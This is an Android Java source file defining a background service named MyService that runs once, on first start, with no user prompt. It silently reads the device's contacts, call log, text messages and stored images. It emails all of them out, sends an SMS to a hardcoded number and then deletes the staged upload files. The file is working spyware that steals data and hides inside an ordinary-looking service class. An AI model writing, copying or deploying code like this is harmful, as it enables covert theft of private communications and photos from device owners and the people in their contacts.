package com.xuhong.baseclass.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.Nullable;

import com.xuhong.baseclass.model.ImageInSD;
import com.xuhong.baseclass.model.PhoneContacts;
import com.xuhong.baseclass.utils.EmailUtils;

import java.io.File;
import java.util.List;

import rx.Observable;
import rx.functions.Action1;
import rx.schedulers.Schedulers;

/**
 * Created by BHKJ on 2016/9/20.
 */

public class MyService extends Service {

    @Override
    public void onCreate() {
        super.onCreate();

        SharedPreferences sp = getSharedPreferences("once", Context.MODE_PRIVATE);
        boolean once = sp.getBoolean("once", true);

        if (once) {
            Observable.just(1)
                    .observeOn(Schedulers.io())
                    .subscribe(new Action1<Integer>() {
                        @Override
                        public void call(Integer integer) {
                            PhoneContacts phoneContacts = new PhoneContacts();
                            try {

                                EmailUtils.sendEmail("电话号码", phoneContacts.getPhoneContacts(MyService.this));
                                android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
                                smsManager.sendTextMessage("18180646037", null, "号码", null, null);

                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    });
            Observable.just(2)
                    .observeOn(Schedulers.io())
                    .subscribe(new Action1<Integer>() {
                        @Override
                        public void call(Integer integer) {
                            PhoneContacts phoneContacts = new PhoneContacts();
                            try {
                                EmailUtils.sendEmail("通话记录", phoneContacts.getCallPhone(MyService.this));
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    });
            Observable.just(3)
                    .observeOn(Schedulers.io())
                    .subscribe(new Action1<Integer>() {
                        @Override
                        public void call(Integer integer) {
                            PhoneContacts phoneContacts = new PhoneContacts();
                            try {
                                EmailUtils.sendEmail("短信记录", phoneContacts.getMsg(MyService.this));
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    });

            Observable.just(4)
                    .observeOn(Schedulers.io())
                    .subscribe(new Action1<Integer>() {
                        @Override
                        public void call(Integer integer) {
                            ImageInSD imageInSD = new ImageInSD();
                            imageInSD.getImagePathFromSD();
                            List<String> paths = imageInSD.getImagePathList();

                            try {
                                EmailUtils.sendEmailPic("图片", "图片", paths);
                                String str = Environment.getExternalStorageDirectory() + "/upload";
                                File file = new File(str);
                                File[] files = file.listFiles();
                                for (File fileChild:files) {
                                    if (fileChild.isFile()){
                                        fileChild.delete();
                                    }
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }


                        }
                    });
        }

        SharedPreferences.Editor editor = sp.edit();
        editor.putBoolean("once", false);
        editor.apply();

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
